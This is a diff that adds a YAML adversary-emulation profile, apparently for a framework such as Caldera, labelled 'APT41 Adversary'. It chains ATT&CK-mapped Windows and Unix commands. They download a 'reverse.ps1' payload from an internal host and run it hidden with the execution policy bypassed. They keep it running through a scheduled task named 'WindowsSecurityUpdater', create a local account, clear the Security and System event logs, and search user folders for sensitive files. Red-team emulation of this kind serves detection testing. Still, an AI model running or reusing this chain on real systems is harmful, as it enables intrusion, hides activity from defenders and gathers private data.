@@ -1,0 +1,105 @@
+id: e178c615-9c74-48db-86fd-ee0dd34ad52e
+name: APT41 Adversary
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 1afaec09315ab71fdfb167175e8a019a
+- 2f5e819a0fdae54834fa85a0b797d302
+- ba8ddc38c7c6ced12fecc0d695c5e57c
+- c93df79781db0a1ed7cc34323f2ecec0
+- fcf71ee3-d1a9-4136-b919-9e5f6da43608
+- d7967a23c8c030c698893f242e622be1
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+abilities:
+ 1afaec09315ab71fdfb167175e8a019a:
+  name:  Download Macro-Enabled Phishing Attachment
+  tactic:  initial-access
+  technique_name:  "Phishing: Spearphishing Attachment"
+  technique_id:  T1566.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Invoke-WebRequest -Uri "http://10.221.1.130:8000/reverse.ps1" -OutFile "$env:APPDATA\reverse.ps1"
+ 2f5e819a0fdae54834fa85a0b797d302:
+  name:  PowerShell Command Execution
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "$env:APPDATA\reverse.ps1"
+ ba8ddc38c7c6ced12fecc0d695c5e57c:
+  name:  Powershell Cmdlet Scheduled Task
+  tactic:  multiple
+  technique_name:  "Scheduled Task/Job: Scheduled Task"
+  technique_id:  T1053.005
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:APPDATA\reverse.ps1`""
+       $trigger = New-ScheduledTaskTrigger -AtLogOn
+       Register-ScheduledTask -TaskName "WindowsSecurityUpdater" -Action $action -Trigger $trigger
+ c93df79781db0a1ed7cc34323f2ecec0:
+  name:  Create a new user in a command prompt
+  tactic:  persistence
+  technique_name:  "Create Account: Local Account"
+  technique_id:  T1136.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user /add "T1136.001_CMD" "T1136.001_CMD!"
+ fcf71ee3-d1a9-4136-b919-9e5f6da43608:
+  name:  Clear Logs
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear Windows Event Logs"
+  technique_id:  T1070.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Clear-Eventlog Security;
+       Clear-Eventlog System;
+   - pwsh:
+     platform: windows
+     command: |
+       Clear-Eventlog Security;
+       Clear-Eventlog System;
+ d7967a23c8c030c698893f242e622be1:
+  name:  File and Directory Discovery (PowerShell)
+  tactic:  discovery
+  technique_name:  "File and Directory Discovery"
+  technique_id:  T1083
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       ls -recurse; get-childitem -recurse; gci -recurse
+ 90c2efaa-8205-480d-8bb6-61d90dbaf81b:
+  name:  Find files
+  tactic:  collection
+  technique_name:  "Data from Local System"
+  technique_id:  T1005
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+   - psh:
+     platform: windows
+     command: |
+       Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
+       exit 0;
+   - pwsh:
+     platform: windows
+     command: |
+       Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
+       exit 0;
+   - sh:
+     platform: linux
+     command: |
+       find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
